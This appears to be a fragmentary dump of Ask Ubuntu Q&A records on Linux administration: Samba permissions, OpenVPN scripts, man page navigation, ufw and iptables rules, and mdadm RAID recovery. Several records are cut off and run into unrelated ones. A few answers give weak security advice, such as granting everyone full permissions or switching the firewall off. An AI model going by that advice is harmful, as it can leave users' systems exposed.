gnome-applets package, then right click your panel and add the frequency scaling applet.  Keep an eye on that.\n\nA: A test suite should put the system under significant load and if temperature (or other) related failures result under that scenario, then it might be grounds for the system to fail certification. Otherwise, if temp, even though a bit higher, is manageable by the system, all is probably well, as long as the system functions normally.\nMaybe this just means that Linux is way hotter than Windows :P\n", "Q: Nautilus file share for multiple users is not working. Only owner gets access I have always had trouble setting up samba shares with ubuntu. In the past I've tried getting it to work by configuring /etc/samba/smb.conf but never achieved what I wanted. Last time I managed to get it working by making a share with nautilus built in file sharing (which utilises samba). Now when I try do it again it doesn't work. (running ubuntu 10.10 Desktop x64)\nWhat I'm trying to achieve is a share which is available for multiple users (those who are in the same group) and not just the owner (who also is included in the group). As it is now I can connect with only the owner, the others are getting an error when I try to connect with windows 7. All the users are within the same group and the folder permissions are 770. The files and folders have the correct group settings.\nI think there is no restrictions in the User Settings for the other users blocking them and I marked \"make available to other users (or whatever it says)\" in the file sharing dialog.\nWhat can I do?\n\nA: I finally was able to solve this. Visit this page for a detailed walkthrough:\nhttp://ubuntuforums.org/showthread.php?t=1699453&page=2\nIt turned out that the problem was because of a flow of permissions. I also had the same problem on another setup I did later on :) It's basically that the user lacks read permissions to the parent folder that holds the share. When setting up shares it's easiest if you set full permissions to everyone, from the directory holding the shares and onwards, and then afterwards start limiting permissions so that you don't bang your head against a silly problem like I've done several times ;)\n", "Q: Can I make Evolution to automatically check emails when I launch it? By default when Evolution is launched, I have to press the button \"Check emails\" (or press F9) to receive new emails. I would like it to be automatic each time I launch Evolution. Is it possible?\n\nA: Evolution checks for new mail for every account that you have set up automatic email checking. To turn on automatic email checking:\n\n*\n\n*Navigate to Edit ➜ Preferences ➜ Mail Accounts ➜ select one of your accounts ➜ Edit ➜ Receiving Options, check the Check for new messages every XX minutes and set the time interval to whatever you want.\n\n\nIf you don't want Evolution to check mail automatically, set the time interval to the maximum 1440 minutes. This will cause Evolution check for new mail 24 hours after you start it up, most likely you will have either shutdown your computer or quit Evolution by then.\n\n\n\n*Repeat step 1 for every account you want to check the mail for on startup.\n", "Q: How can I launch Thunderbird from Command Line and Auto Check IMAP Email?

How can I associate a script to OpenVPN so that it runs when the VPN is connected successfully?\n\nA: network-manager-openvpn does not provide such functionality, you have to use openvpn directly.\nPass --script-security 2 --up /path/to/your/script to it when connecting. If you're using a configuration file located at /etc/openvpn/, append the next lines to your configuration file:\nscript-security 2\n# run /etc/openvpn/up.sh when the connection is set up\nup /etc/openvpn/up.sh\n\nFrom the OpenVPN manpage:\n--script-security level [method]\n              This  directive offers policy-level control over OpenVPN’s usage\n              of external programs and scripts.

If you have not specified a User and Group setting, OpenVPN will run scripts like down as root too.\n\nA: As that is a quite old thread I'm not sure if still of interest. If you still want to use the NetworkManager to connect to a VPN you can add a simple udev rule like that:\nKERNEL==\"vpn0\", RUN+=\"/PATH_TO_THE_SCRIPT/SCRIPT_NAME\"\nThis should run any script after the VPN is created.\n\nA: To the question: \"How can I associate a script to OpenVPN so that it runs when the VPN is connected successfully?\" I want to point out that Lekensteyn provided an excellent answer. But, at the time his answer was composed, it lacked a little clarity on how openvpn command line arguments should be provided to start openvpn on an ubuntu machine, especially so that it works the same after reboots.  \n\nOpenvpn command line arguments on Ubuntu:\nNaturally, one can start openvpn from a command line with any avalable legal options. But, on an Ubuntu machine, if one wants to start openvpn with the same command line arguments after a reboot, they should consider editing the file /etc/default/openvpn. Examine following lines:\n# Optional arguments to openvpn's command line\nOPTARGS=\"\" \n\nFrom the community openvpn man page on --script-security\n--script-security level\n    This directive offers policy-level control over OpenVPN's usage of external \n    programs and scripts. Lower level values are more restrictive, higher\n    values are more permissive. Settings for level:\n0 -- Strictly no calling of external programs. \n1 -- (Default) Only call built-in executables such as ifconfig, ip, route,\nor netsh. \n2 -- Allow calling of built-in executables and user-defined scripts. \n3 -- Allow passwords to be passed to scripts via environmental variables\n(potentially unsafe).\n\nOpenVPN releases before v2.3 also supported a method flag which indicated how \nOpenVPN should call external commands and scripts. This could be either execve\nor system. As of OpenVPN v2.3, this flag is no longer accepted. In most *nix \nenvironments the execve() approach has been used without any issues.\n\nSome directives such as --up allow options to be passed to the external script.\nIn these cases make sure the script name does not contain any spaces or the \nconfiguration parser will choke because it can't determine where the script \nname ends and script options start.\n\nCombined with an abbreviated section on --up \n\n--up cmd\n    Run command cmd after successful TUN/TAP device open (pre --user UID change).\n    cmd consists of a path to script (or executable program), optionally followed\n    by arguments. The path and arguments may be single- or double-quoted and/or \n    escaped using a backslash, and should be separated by one or more spaces.\n\nExample:\nOn my machine with a openpvn server.conf, I have the following lines in my /etc/default/openvpn file:\nOPTARGS=\"\n    --script-security 2\n    --up /etc/openvpn/nat.sh\n\" \n\n\nIncidentally, the nat.sh sets up network address translation for routing private network traffic from openvpn clients to the public internet; which is good for when one does not trust a public WIFI access point.   \n\nAside from allowing to restart as expected after a reboot, when /etc/openvpn/[client or server].conf and /etc/default/openvpn files are properly configured,  openvpn can be started or stopped with: \nsudo service openvpn start\nsudo service openvpn stop\n\nOther useful options available for service openvpn include cond-restart,force-reload,reload, restart,soft-restart, start, status, stop.        \n\nA: I stumbled upon the answer in my research to solve this issue and I found out that the best solution is (using openvpn server) as follows:\nCreate a script to be executed:\n# nano /etc/openvpn/up.sh\n<file:contents>\n#!/bin/sh\n\n# export >> /var/log/openvpn/openvpn-up.log\nD=`date \"+%Y-%m-%d %H:%M\"`\necho \"[$D] ($local_port_1:$proto_1) $X509_0_CN: $trusted_ip => $ifconfig_pool_remote_ip\" >> /var/log/openvpn/openvpn-up.log\n</file>\n\nAdd the following lines into the openvpn configuration (usually /etc/openvpn/server.conf). In the answer above it was used up and down, which are used when the server starts (restarts).

It also has a jetpack. It’ll take you about 15 minutes to play.\n\n\nThe description is accurate but don't be put off by it. You get more for your 15 minutes than you do in a lot of other games. It has a nice little story, superb music, and there's a native Linux build (as well as OSX and Windows builds) so almost everybody is catered for.\nAt the very least, this is promising work from a clearly talented developer who is making\nthings for Linux users. If you like the game you should show them your appreciation via twitter or as a comment on the page.\nAs a side note, I found running the Beacon binary directly didn't work. Just run chmod +x Beacon.sh and then run that launcher script instead.\n\nA: Heroes of Newerth\nProprietary, free to play\nA Multiplayer Online Battle Arena game (think the Warcraft III map \"DotA\") that was re-released as free-to-play in 2011.\n\n\nA: Scoregasm \nProprietary, priced at $9.99\n\nThat's not a typo.

Things like this are great with dual analogue sticks.\nFree demo available from the game's site as well as Desura if you're in the Linux beta group (which you should be!)\n", "Q: Crysis 2 Demo on Wine error I was trying to install the Crysis 2 demo on wine, but after extraction it said   \nUnable to find a volume for file extraction.  \nPlease verify that you have proper permissions. \n\nand ended the setup there.\n\n\nI have had trouble in the past getting Angry birds to run on it too - Couldn't make Angry birds work on wine\n\nA: You need to use #winetricks  and install the VC++ packages :).\n", "Q: Will \"Oilrush\" be available for purchase from the Software Center? Oilrush is a game with a high-end graphics engine due for release on the linux platform very soon. As a matter of fact, preordering is already possible! \nThat is why I would like to ask whether it will be available for purchase in the Ubuntu Software Centre.\nIf it will be offered, I would wait until it is available and buy it to support Ubuntu. If not, I'd rather buy it now and save some money.\n\nA: Just to keep this up to date:\nIt is in the software center now! (In 11.04 Natty at least)\n\nA: Definitive answer: Maybe.\n\n\nA: I think it will, eventually, there is a post in Ubuntu Brainstorm to add a few more paid apps to the Software Center. Besides, Oilrush is a huge release as a Linux game, there are few games that can be compared to it, and a lot of people are looking forward for a stable Ubuntu release.\nEDIT:\nI think i got your definitive no, i'm afraid. The Feature Freeze of the Natty development cycle was on February 24th. This means that no new packages will be added to the official repositories. AFAIK, unless they make an exception, we will have to wait until Ubuntu 11.10 to be able to purchase Oilrush from the software center.\nMore info here\n", "Q: How to find corrupted files? Some files on my hard drive are corrupted (no worries, nothing system-related, just a junk of data files, mp3 etc.). I found that out when I tried to burn them all to a DVD, the burning application show a message that it cannot read the files as they are corrupted. [This is probably a drive issue, it had happened me once or twice already].\nI don't care about recovering them, but I have to determine which ones are corrupted. I cannot check by manually opening them all, as there are thousands of them. Is there any tricky way to check all the files and list the ones that may cause problems when tried to open?\n\nA: do what luri suggested (copy the files somewhere else). then, use a diff tool like meld (sudo apt-get install meld) will be very helpful by doing a directory comparison between the original and the copy. you can filter out the identical files, and only see the differences. That's how I found some files corrupting a sync recently.\n", "Q: For my project in Launchpad, how do I send all merge requests to a mailing list? I have a project in Launchpad with a bzr tree.

There are a few ways to do this; zenity seems to be the most polished.  However, I've found at least two problems with zenity:\n\n\n*\n\n*Messages do not appear on all workspaces.  I tried using the gtk option --screen to control this, but they just appear on the current workspace regardless.  So if I am switching workspaces as the message comes up, I will not see it.\n\n*Messages do not appear above all other windows.  Specifically, if I am using guake, a new zenity message will appear below the guake window and I won't be able to see it.\nI tried a few other apps a while back.  Both gmessage and xmessage exhibited problem 1; gmessage also exhibited problem 2.  I did find that kalarm, which can be scripted from the command line, worked acceptably, but I'm trying to avoid running the KDE stack if possible, and would prefer something lightweight with zenity's versatility.\nIt seems that it might be possible to arrange for these problems to be resolved by setting the WM_CLASS, but I'm in a bit over my head there.  It might also be possible to make modifications to the window after it launches with a script, but again I'm not sure where to look for resources on that.\nupdate\nAs suggested by @geirha, I've looked into using notify-send (via the package libnotify-bin, which appears to be a client to notify-osd).  There are numerous problems with this framework, for which I've filed a few bug reports.  I'm hoping that devilspie can provide workarounds for some or all of these issues, or that there is another notification system which works more reliably.\n\nA: Maybe you want notify-send?\nOtherwise, there's devilspie, which allows you to say things like \"all windows with this name (or of this class or with this role), shall be visible on all workspaces\".\n", "Q: When I try to minimize windows, they close?

This happens when I start it with \"gnome-shell --replace\". Any idea how to make it behave properly? Laptop is a MSI U21, an0d I run with a 'nomodeset' startup option. Without this option the screen clears to just wallpaper and stays that way.\nGnome-shell v2.31.5\nKernel 2.6.35-27 (& 28 as well)\n\nA: You could try starting it in its own session instead of replacing your current WM with it. There's a package in the repos for that in Maverick--gnome3-session--but if you want it to start a compiled-from-git version instead you'll have to edit the session file (/usr/share/xsessions/gnome3 maybe) or create a symlink to the version you want to start (sudo rm /usr/bin/gnome-shell should remove the old version of the shell from the repos, and then sudo ln -s ~/path/to/your/gnome-shell /usr/bin/gnome-shell should link to it).  \n\nA: Removing the boot-up option \"nomodeset\" seems to correct this problem. The MSI U210 needs \"nomodeset\" to handle an external monitor correctly, and so I have its set as a default. When I booth without it, gnome-shell behaves normally. It sounds like there is a fix for the U21p nomodeset requirement in Natty, so hopefully I'll be able to work as I wish then.\n", "Q: How to jump to the end of a 'man' page When I open up the manual for a command (man wget for example) the manual can be many hundreds of lines long.

This leaves numerous unnatural, wrong, and bad ways.   \nSo I'll deal with a couple of those. \n\nFirst, you don't have to read the man pages from a terminal (even though it will make you a better person).  You can read them in html, for instance. \nYou can generate the html yourself from the sources on your system, but it's easier to go to manpages.ubuntu.com .\nHere's the hefty bash page, turned into light and fluffy web-renderable html :\nThe Bash Manpage from manpages.ubuntu.com\n\nHere's a hack that can actually be useful :  use tail to slice off some number of lines from the end of the man page output, and view that.  \nLeast usefully, most trivally: \nman bash | tail -100\n\nmight be useful : \nman bash | tail -1500 | more\n\n(or man bash | tail -1500 | less)\nMore useful (if contrived): \n$ man bash | wc -l    # how many lines are in the man-page?\n5375\n$ man bash | tail -2600 | less  # jump to the middle of the output\n\n\nOf course, this is what I'd do: \nman tac | tac | less\n(Although you might start out reading man tac forwards.)\n\nA: Some handy easy-to-remember less (and thus man) commands:\n\n\n*\n\n*> takes you to the end of the file\n\n*< takes you back to the beginning\n\n*q exits less / man (as noted by @Kwinto)\n\n*/ initiates typing a search term:\n\n*\n\n*press enter to start searching\n\n*if you press  enter immediately, it searches for the next occurrence of the last entered search term\n\n*n also searches (forward) to the next occurrence\n\n*N searches backwards to the previous occurrence\n\n\n\nHope that helps (:\n\nA: When inside of the document viewer through the man command, press h or H in order to view the man's help.\nFrom man's help screen:\nJUMPING\n\n  g  <  ESC-<       *  Go to first line in file (or line N).\n  G  >  ESC->       *  Go to last line in file (or line N).\n  p  %              *  Go to beginning of file (or N percent into file).\n\nAnother good idea would be to press the Home or the End keys. :)\nGood luck!\n\nA: *\n\n*Press G\n\n*Press q\nYou can type man less to get more information.\n", "Q: sudo access per folder? is that possible? is it possible to give sudo privileges to a user for a specific folder?\ne.g i want the user 'dads' to have sudo access for creating/deleting files in a folder 'virgo' in /opt \n\nA: No, i'm pretty sure you can't, but you can let other users read/write in that folder by changing it's permissions.\nAnother approach is to create a group, set that group as the owner of the folder, and then add all the users you want to that group.\n\nA: For complex file/folder permissions scenarios, consider the use of ACLs.

Don't really know what that means ; I've never used git before, but I figured it was time to learn so,\n\n\n*\n\n*I first installed git.  \n\n*Next I tried to clone the git directory of the software I want to install.\n\n*I got a message saying \"the authenticity of (IP) can't be established\".  I went ahead and ended up with another message saying, \"warning, such and such will be added to known hosts.\"  I went ahead, and it said something about hanging up on the connection.\nAfter searching the internet for a while I realized I didn't need git to install the software but now I have it installed, and have added some host to some file or another.  I'm concerned I've created some security issues I need to fix.\nCan anyone help me undo what I've done, or better understand what I've done.  Did adding a git project open up my system?  Beyond that can anyone tell me how git works.  Everything I've found assumes I know stuff that I don't yet.\nThanks\n\nA: Git is a version control system (a DVCS to be more exact).  A VCS (version control system) on a server (or on a computer, or in the cloud), is used to store and track changes to data.  This just means that there is a repository of files (usually code in some programming language, along with configuration, instructions, etc.), and in addition to sitting on a server, it has changes made to it tracked across time.  The version control system keeps track of any changes to any file in a project, and these projects are hosted, and frequently public or shareable.\nA version control system with a front-end (whether git, or subversion/svn, bazaar/bzr, mercurial/hg, etc.) really just allows you to install applications (or packages, code, scripts, patches) that aren't available or up-to-date in the standard channels. Another way to put this is that it allows the authors of the code to share it with you and others.\nGit (or another VCS) does this by pulling in all of the data from a repository (the remote IP.IP.IP.IP in your example) and dropping into a directory (that you choose, ultimately) on your system.   By itself, this does nothing, unless you are actually running the code that you've gotten.\nWhen you are using a VCS, having gotten the code doesn't necessarily mean you are going to run it as a complete suite.  You might test it, update it, merge in some changes, take out some pieces.   But in some cases, you can install complete applications (or more) from a repository.\nIf you can be sure that the code is safe, then this is a great way to play around with goodies that might not be available otherwise.\nHaving git on your system is unlikely to be a problem.  If you're tight on space, you can remove it from the software center or with \nsudo apt-get remove git.  (There might be additional packages, depending on how you installed it.)\nIt's hard to know how to undo anything that might have been done with downloaded code without knowing what it is that you've downloaded.  You might start by doing something like ls -lart in your home directory (from the command line), or looking in Nautilus file manager for recently modified directories.   For both of these methods, you're looking for the last changed directories files, some of which might be the ones you pulled onto your system with git.  If you find that, you'll have a better idea if there's anything else you need to remove or get help with undoing.\nAs far as the adding the host, I'm pretty sure that @Christoph (as well as @psusi) is correct.  The easiest way to rollback ssh key changes you have made is to do this:   \n buntubox#$  rm -i ~/.ssh/known_hosts \n\nNote that this will delete the entire known_hosts file.  This isn't usually a problem, because it will be rebuilt as you ssh to additional or repeat hosts. \nAlternately, you can edit the file (with gedit, nano, etc.) and remove lines you don't need. (Each line is associated with a remote host.) Again, this should be safe to do -- at worst, you'll have to accept new keys when logging into systems you've logged into before. \n\nA: The message you got was from ssh, which was probably the protocol you were using to connect to the git server.  Ssh remembers the fingerprint of remote servers you have used in the past so that when you try to connect again, it can verify that it is actually the same server, and not someone trying to impersonate that server.  Naturally the first time you connect, it can't do this, which is what it was warning you about.  What you saved was the fingerprint so that future connections can be verified as being to the legitimate server.\n", "Q: Sed problem  in a Bash script I'm having a problem using the sed command .

To make it work nicely with Banshee, I've created an .is_audio_player file on the device, containing audio_folders=Music.\nEvery time I plug it in, Banshee takes around two minutes to index the thing, slowly building up the library - and being unusably sluggish while doing that.\nIs there, per chance, any way to speed it up? Should I not mount the hard disk as a music player, but add it's contents to my library? And, if I do, won't that give me lots of annoying X symbols next to the titles, as they can't be found sometimes?\nWhat's the best way to have my library on an external HDD?\n\nA: \nIs there, per chance, any way to speed it up? \n\nI don't think so. When banshee scans the library, it reads the metadata of all files. This is a slow process, more if it has to scan ~250 albums (eq to 1300 song more or less). Another factor is the speed of the external hard drive and how it is plugged into the PC.\n\nShould I not mount the hard disk as a music player, but add it's contents to my library?\n\nIf you do so, and you add it's content to banshee, you will get (as you said yourself) a lot of error messages pointing that the media files could not be found.

I am facing an issue with brightness control in my laptop which has Intel HD graphics and Ubuntu 10.10 64-bit. So when I searched for a fix  I found that a common suggestion is to edit the GRUB file line, GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash\" to \nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash acpi_osi=Linux acpi_backlight=vendor\"\nDocumentation for boot parameter acpi_osi tells:\n\nacpi_osi=   [HW,ACPI] Modify list of supported OS interface strings\n            acpi_osi=\"string1\"      # add string1 -- only one string\n            acpi_osi=\"!string2\"     # remove built-in string2\n            acpi_osi=               # disable all strings\n\n— http://redsymbol.net/linux_boot_parameters/\n\nI don't find a reason why this should fix any laptop issue.\nSo could anyone tell me what the kernel boot option acpi_osi=Linux do?\n\nA: I think you mean =Windows, not Linux.  The argument tells the kernel to lie to the ACPI BIOS and tell it that it is something other than Linux (which is why specifying Linux is silly).  Certain BIOS are known to check to see if they are being run under Windows, or a specific version of Windows, and disable functionality if they are not.  This parameter lets you work around that idiocy.\n\nA: \nI think you mean =Windows, not Linux.\n  The argument tells the kernel to lie\n  to the ACPI BIOS and tell it that it\n  is something other than Linux (which\n  is why specifying Linux is silly).\n\nI'm sure he means what he wrote. Yes, BIOS's usually disable functionality if Windows is not detected, but specifying Linux is not silly because by default the kernel responds false when asked if Linux is running. acpi_osi=Linux tells the kernel to respond true.(see drivers/acpi/osl.c) It seems that you need to tell the BIOS the truth.\nIt's either a driver problem or incorrect ACPI implementation. You'd have to take out your dsdt and disassemble it to review the code and get a better understanding of what is broke or disabled under the Linux OSI. \nReference\n\n\n*\n\n*Why Linux ACPI driver pretends to be Windows and disables OSI(Linux) by default\n\n*ACPI/Fix common problems - Gentoo Linux Wiki\n\n*How do I add a kernel boot parameter?\n\nA: The parameter adds \"Linux\" to the list of supported operating systems that the kernel will get when it asks the BIOS \"Hey, what do you support\".  By adding that string, later, things that use ACPI will say \"hey, I have a feature that needs ACPI, and I'm running Linux - what platforms are supported?\" and they'll get back a list which will include Linux.\nBy setting this to Linux, you basically disable any checking to see if the BIOS says that certain ACPI features will work with certain operating systems.  And that often makes things works which were previously hidden.  But it could also break stuff that used to work, in [hopefully] rare cases. :)\n", "Q: SMTP server to deliver ALL mail to user@localhost I'd like to configure an SMTP MTA to accept all mail addressed to any domain and deliver it to my local user account.\nIt would be very useful for debugging mail sent in some code I'm working on.

Should I just redo the wizard for eth0, or will I then lose wlan0?\n(2) If it makes a difference I'm sharing a directory that I share between local users using bindfs. See my answer to Good and easy way to share files on local machine\n\nA: Here is one easy way to do it.  My answer is going to assume that you have disabled all other firewall rules / packages you have tried.\nUbuntu has a nice very simple command line interface to \"iptables\" (Linux firewall) which is call UFW for Uncomplicated FireWall.\nsimply do this:\nsudo ufw status\n\nyou'll see that your firewall is currently inactive:\n\"Status: inactive\"\nif you then issue the following command:\nsudo ufw enable\n\nyou'll then get this message if it worked:\n\"Firewall is active and enabled on system startup\"\nFinal Thoughts / Wrap Up:\nHonestly this is all you'll probably need as the default ufw policy allows all outbound traffic (i.e. you surfing, downloading, etc) and blocks all inbound traffic to your box.\nIf you wanted to allow say... ssh/scp connections to your box/laptop for some reason you could simple add a rule such as this:\nsudo ufw allow proto tcp from 192.168.1.0/24 to any port 22\n\nIn my opinion the syntax / commands are very simple and a gui app or overlay isn't bad, but not necessarily needed for what you seem to be wanting to achieve.\nFor more info check out the community docs on UFW here:\nhttps://help.ubuntu.com/community/UFW\nI hope this has been helpful.  =)\n##### EDIT #####  (adding this in case people don't see my comment reply below and to add a resource link)\nIf you are wanting to open up certain ports click this link and look up all the ports you need (tcp and/or udp) for the services you listed:\nhttp://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers\nThen to open that port up from anywhere to your machine do this:\nsudo ufw allow proto tcp from any to any port __\n\nor\nsudo ufw allow proto udp from any to any port __\n\nIf you only want to open it up to ONLY your home 192.168.1.x network you could do this:\nsudo ufw allow proto tcp from 192.168.1.0/24 to any port __\n\nor\nsudo ufw allow proto udp from 192.168.1.0/24 to any port __\n\n\nA: First, I'd un-install Firestarter completely.  I don't believe that it's still under development any longer (might be wrong), but regardless, it's been superceded by the \"official\" Uncomplicated Firewall (ufw) which has a nice UI already.  So :\nsudo apt-get remove firestarter\n\nThen install gufw :\nsudo apt-get install gufw\n\nThen reset your IPTables (which is what UFW is based on) :\nsudo ufw reset\n\n(you can also do this using gufw, in the Edit menu)\nAnd then finally manage your firewall using that tool.  Start GUFW from System/Administration/Firewall Configuration.\n\n\nA: the issue you experienced when installed Firestarter means you didn't open the proper ports.\nAfter enabling the firewall you need to open all the necessary ports in order services to work. \nSamba uses the following:\nUDP/137    - used by nmbd\nUDP/138    - used by nmbd\nTCP/139    - used by smbd\nTCP/445    - used by smbd\n\nOpenVPN uses \nport 1194\n\n\nA: I had a similar problem when using a wired and usb connection.\nTurned out some thing was creating iptable rules when I plugged I connected using the USB device as well, which caused me to loose my internet connection.\nNot sure if it was firestarter causing it but I did have it installed\n\nA: If you use a gateway (wlan router or something) in this case you don't need a extra firewall on your workstation, because thats not the touchpoint to the internet. Your router manage the filters to the private lan (your workstation).\n\nA: No, you don't need a firewall.  Turn it back off and don't worry about it.  Just make sure you don't install any server services, and then misconfigure them to be insecure.\n\nA: I concur with what schneehase already wrote: considering that Linux is relatively safe as it doesn't leave too many open ports, the best solution in term of easy management is to put all the required shields up on your router/gateway that gives you access to Internet, and to turn off the firewall for a PC that lives inside your LAN.

Can somebody please help me?\n\nA: How to restore the Ubuntu grub bootloader (9.10 and beyond)\nFirst you need to find out what your drives are called. You can do this by going to a terminal and typing:\nsudo fdisk -l\n\nFrom that you need to find the device name of your Ubuntu drive, something like “/dev/sda5″.\nSo, still in the terminal, type:\nsudo mkdir /media/sda5\nsudo mount /dev/sda5 /media/sda5\n\nAnd then, to reinstall the grub:\nsudo grub-install --root-directory=/media/sda5 /dev/sda\n\nPush enter and you’re done! Of course you need to replace “/dev/sda5″ and “/dev/sda” with what you found in the fdisk output.\nThis is extracted from http://ubuntuforums.org/showthread.php?t=1014708 thread by talsemgeest.\n\nA: http://bkpavan.wordpress.com/2008/04/02/how-to-boot-linux-using-windows-bootloader-xp/\nTry this\n\nA: The problem is that Windows changed the MBR Master Boot Record to boot Windows instead of GRUB which in turn gave you the option of booting into Windows, Ubuntu or another flavor of Linux. GRUB and Ubuntu are still there in their own disk partition unless Windows was directed to install on the entire disk. At this point you can boot from the Ubuntu Live CD you used to install Ubuntu. And here's where I become unsure as to exactly what you need to do to restore your MBR since you probably never made a back up copy. If you'd been running Ubuntu 11.04 there's a program called \"Boot-Repair\" that could be used to restore the MBR. From the LiveCD you can mount your exiting Ubuntu 9.04 partition which would give you the opportunity to backup your /home folder and then worst case re-install Ubuntu and restore your data from the backup. I wish I had a better answer but since the the other answers didn't seem to help I wanted to at least give you some better information on exactly what needs to be restored and that is an MBR that boots GRUB from your Ubuntu partition. Hopefully my answer will lead you to find a solution.\nInfo on Boot-Repair https://help.ubuntu.com/community/Boot-Repair\n", "Q: Battery Indicator Error.

I saw the option Suspend in Ubuntu. What does it do?\nI tried this option, but my PC goes to low power mode and then, I can't bring it to a normal condition. So I had to power off my PC. \n\nA: Suspend mode is a special low-power mode, often used on laptops, that preserves the contents of RAM while conserving power.\nThere are two main forms of suspend - suspend-to-RAM and suspend-to-disk (also known as \"software suspend\" or \"hibernation\"). Suspend-to-RAM uses more power, but is almost instant. Suspend-to-disk, on the other hand, uses no power (the system actually powers off), but takes longer to suspend/resume.\nYou can find more info in this wiki page.\n\nA: When you click on suspend, everything on your system goes into a low-power mode, except for memory which is placed in such a state that it will retain its contents. The peripheral bus lose power and devices attached to your client are also suspended. Typically, it should take around 1-3 seconds to enter suspend (or suspend-to-RAM) state.\nOn mobile clients, like laptops, you can enter a suspend state (or sleep) by simply closing the lid, or choosing suspend from the power menu options. To wake up the system from suspend, you simply have to open the lid. \nOn some models of laptops the lid switch does not enable a wake. In that case, you could hit any key or the power button to wake the system from suspend. On desktops you could hit the dedicated sleep key (if there is one) on the keyboard, or simply push the power button to wake up the system from the suspend state.\n", "Q: How to configure my VirtualBox's Ubuntu IP?

After bootup it appeared that it recreated the intent map as it was still in mdadm config, so I removed it from config and rebooted again.\nNow all I see is that all mdadm processes deadlock, and don't do anything.\n  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND\n 1937 root      20   0 12992  608  444 D    0  0.1   0:00.00 mdadm\n 2283 root      20   0 12992  852  704 D    0  0.1   0:00.01 mdadm\n 2287 root      20   0     0    0    0 D    0  0.0   0:00.01 md0_reshape\n 2288 root      18  -2 12992  820  676 D    0  0.1   0:00.01 mdadm\n\nAnd all I see in mdstat is:\n$ cat /proc/mdstat\nPersonalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10]\nmd0 : active raid6 sdb1[1] sdg1[4] sdf1[7] sde1[6] sdd1[0] sdc1[5]\n      2929683456 blocks super 1.2 level 6, 1024k chunk, algorithm 2 [7/6] [UU_UUUU]\n      [>....................]  reshape =  0.0% (37888/976561152) finish=567604147.2min speed=0K/sec\n\nI've already tried mdadm 2.6.7, 3.1.4 and 3.2 - nothing helps.

That resembles my previous question where I was unable to make that setting permanent.\nSo after setting it 8192 reshape continued, so problem is solved.\nGod bless Neil Brown :-)\n\nA: Sometimes a reshaping will sit at speed=0K/sec because the backup file failed to be created, or was lost during the processing. \nThe solution, in this case, was supplied by Neil Brown in response to an email to linux-raid@vger.kernel.org.\n\nYou should be able to simply stop the array and re-assemble with a different\n  backup file and the magic flag  \"--invalid-backup\" (required mdadm 3.2 or\n  later).\nThe backup-file is only really needed in case of a crash.  As you will stop\n  the array cleanly  there will be no need to recover anything when you\n  re-assemble, so --invalid-backup (Which say \"there is nothing in the backup\n  file, but that is OK) is perfectly safe.\nNeilBrown\n\n\nFor a RAID5, as device /dev/md0, with 7 disk mounted at /mnt/data; \nthe procedure to his answer is: \nAll of the following commands must be run as root or equivalent.\nFind any open connections to the drive: \nlsof /mnt/data\n\nClose them, or stop services that may be interacting with it.\nCommonly:\nsystemctl stop <SERVICE_NAME>\n\nor\nservice <SERVICE_NAME> stop\n\nUnmount, stop, and then reassemble: \numount /mnt/data\nmdadm --stop /dev/md0\nmdadm --assemble --invalid-backup --backup-file=/root/mdadm0.bak /dev/md0 /dev/sdc1 /dev/sdd1 /dev/sde1 /dev/sdf1 /dev/sdg1 /dev/sdh1 /dev/sdi1\n\nDepending on prior configurations, the device may automatically remount after the assembly command. If not, mount with:\nmount /dev/md0 /mnt/data\n\nIt is then safe to restart any services or connections running off of there.\n", "Q: How do I mount an iPod Touch with Banshee?

I have some shell users on a server with 300GB of monthly data transfer. How can I monitor bandwidth usage per user?\n\nA: I just came across NetHogs:\n\nNetHogs is a small 'net top' tool.\n  Instead of breaking the traffic down\n  per protocol or per subnet, like most\n  tools do, it groups bandwidth by\n  process.\n\n\nThis ought to let you track bandwidth by username. Might still need another couple tools to log the info and add it all up, but it's a good start without directly using iptables.\n\nA: You can use Cacti\n\nCacti is a complete frontend to RRDTool, it stores all of the necessary information to create graphs and populate them with data in a MySQL database. The frontend is completely PHP driven. Along with being able to maintain Graphs, Data Sources, and Round Robin Archives in a database, cacti handles the data gathering. There is also SNMP support for those used to creating traffic graphs with MRTG.\n\nOr vnStat\n\nvnStat is a console-based network traffic monitor for Linux and BSD that keeps a log of network traffic for the selected interface(s). It uses the network interface statistics provided by the kernel as information source. This means that vnStat won't actually be sniffing any traffic and also ensures light use of system resources. \n\nBoth of them are great.\n\nA: I looked a bit, and I haven't found a comprehensive gui package that does what you want. Hopefully one exists and someone will post about it here eventually.\nI'm not really a networking guy, but from what I've read, among many other things netstat and iptables are supposed to do for ip/host -based user accounting what the acct tools did for system process accounting. This cyberciti.biz link might set you on your way to developing a system with these tools:\nhttp://www.cyberciti.biz/faq/linux-configuring-ip-traffic-accounting/\n\nA: As root, you could at least measure the outgoing traffic on a per-user basis using the \"owner\" module of iptables. If all the users you want to monitor are in /root/list-of-users.txt, you can do:\nfor login in $(cat /root/list-of-users.txt);\ndo\n    iptables -N out_user_$login\n    iptables -A OUTPUT -m owner --uid-owner $(id -u $login) -j out_user_$login\ndone\n\nAnd then the packet and byte counts for each user's outbound traffic are visible:\niptables -L OUTPUT -n -v | grep out_\n\nThis could be extended further with CONNMARK to track the inbound side too.\n", "Q: HTTP Archive (.har) log reader? I've recently moved to kubuntu. Is there any app to read HTTP Archive Log (.har). I know about this http://www.softwareishard.com/har/viewer/. I'm looking for an offline app to view .har files.\nThanks,\njeetesh\n\nA: Of all the offline tools that work on Ubuntu, the HTTP Archive Viewer Chrome extension is probably the easier to install (the other alternatives are web apps that you can host locally, and command line tools which don't give you a useful overview). It's nothing fancy, but it can display a timeline similar to the one in Chrome Developer Toolbar's Network tab, and can show the headers and body of each request and response.\n\nA: You can use HAR Viewer\n\nHAR Viewer is a web application (PHP) that allows to visualize HTTP tracing logs based on  HTTP Archive format (HAR). These files contain recorded information about HTTP traffic\n   performed by web pages. A HAR log can be created by HTTP sniffer tools such as Firebug.\n\nIt's still web-based, somehow, but you can use it on a local server\n\nA: HAR files appear to be JSON files, so for basic analysis you can parse the JSON manually.\n\nA: there are a number of tools / apps that can help visualize .har files and data:\n\n\n*\n\n*ChromeHAR\n\n*harview\n\n*HTTP Archive Reader (for Firebug)\n\n*HTTP Watch\nyou might want to check Har.tech for a complete list of resources\n", "Q: How do I enable WebGL sites with Firefox 4 